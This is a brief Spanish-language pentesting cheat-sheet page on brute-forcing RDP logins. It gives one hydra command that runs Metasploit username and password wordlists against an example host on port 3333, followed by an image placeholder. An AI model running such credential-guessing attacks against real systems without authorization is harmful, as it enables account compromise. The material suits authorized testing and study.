# RDP

## Fuerza Bruta

### Hydra

Para hacer fuerza bruta usamos hydra de la siguiente forma:

```
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://192.168.1.1 -s 3333
```

<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
